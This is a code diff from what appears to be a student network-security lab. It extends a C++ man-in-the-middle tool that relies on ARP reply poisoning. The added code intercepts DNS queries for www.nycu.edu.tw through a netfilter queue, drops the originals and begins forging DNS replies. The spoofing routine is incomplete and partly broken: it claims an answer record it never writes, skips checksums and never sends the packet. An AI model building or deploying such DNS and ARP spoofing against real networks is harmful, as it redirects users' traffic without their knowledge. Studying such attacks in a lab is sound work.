@@ -44,13 +44,13 @@ struct dnshdr {
     uint16_t id;
     uint16_t flags;
     /* number of entries in the question section */
-    uint16_t qdcount;
+    uint16_t qucount;
     /* number of resource records in the answer section */
     uint16_t ancount;
     /* number of name server resource records in the authority records section*/
-    uint16_t nscount;
+    uint16_t aucount;
     /* number of resource records in the additional records section */
-    uint16_t arcount;
+    uint16_t adcount;
 };
 
 string gateway_ip;
@@ -355,8 +355,40 @@ void keep_sending_arp_reply( unsigned char *source_mac_char, unsigned char *gate
 
 }
 
+void send_spoofed_dns_reply(char *packet, int len)
+{                  
+    // change the destination IP address to 140.113.24.241
+    struct iphdr *ip_header = (struct iphdr *)packet;
+    // exchange the source and destination IP address
+    in_addr temp;
+    temp.s_addr = ip_header->saddr;
+    ip_header->saddr = ip_header->daddr;
+    ip_header->daddr = temp.s_addr;
+    // cout to check the source and destination IP address
+    cout << "Source IP: " << inet_ntoa(*(in_addr *)&ip_header->saddr) << endl;
+    cout << "Destination IP: " << inet_ntoa(*(in_addr *)&ip_header->daddr) << endl;
+
+    // change the source port and destination port
+    struct udphdr *udp_header = (struct udphdr *)(packet + ip_header->ihl * 4);
+    // exchange the source and destination port
+    unsigned short temp_port = udp_header->source;
+    udp_header->source = udp_header->dest;
+    udp_header->dest = temp_port;
+    // cout to check the source and destination port
+    cout << "Source Port: " << ntohs(udp_header->source) << endl;
+    cout << "Destination Port: " << ntohs(udp_header->dest) << endl;
+
+    // change the DNS query to DNS reply
+    struct dnshdr *dns_header = (struct dnshdr *)(packet + ip_header->ihl * 4 + sizeof(udphdr));
+    dns_header->flags = htons(0x8180);
+    dns_header->ancount = htons(1);
+    dns_header->adcount = htons(0);
+    dns_header->aucount = htons(0);
+
+    // change the DNS query to DNS reply
 
 
+}
 static int dns_nfq_packet_handler(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg, struct nfq_data *nfa, void *data)
 {
     char *packet;
@@ -393,23 +425,21 @@ static int dns_nfq_packet_handler(struct nfq_q_handle *qh, struct nfgenmsg *nfms
                     ss << packet[i];
                 }
                 string dns_query = ss.str();
-                cout << "DNS query: " << dns_query << endl;
-
-
-                // if ()
-                // {
-                //     cout << "DNS query to www.nycu.edu.tw" << endl;
-                //     // send the spoofed DNS reply
-                //     // change the destination IP address to 140.113.24.241
-                //     // ...
-                //     return nfq_set_verdict(qh, id, NF_DROP, 0, NULL);
-                // }
+                if (dns_query.find("nycu") != string::npos  && dns_query.find("edu") != string::npos && dns_query.find("tw") != string::npos)
+                {
+                    cout << "DNS query to www.nycu.edu.tw" << endl;
+                    // send the spoofed DNS reply
+                    // change the destination IP address to
+                    send_spoofed_dns_reply(packet, ret);
+                    return nfq_set_verdict(qh, id, NF_DROP, 0, NULL);
+                }
             }
         }
 
     }
     return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
 }
+
 
 void analyze_packet(){
     // filter the received packet: HTTP
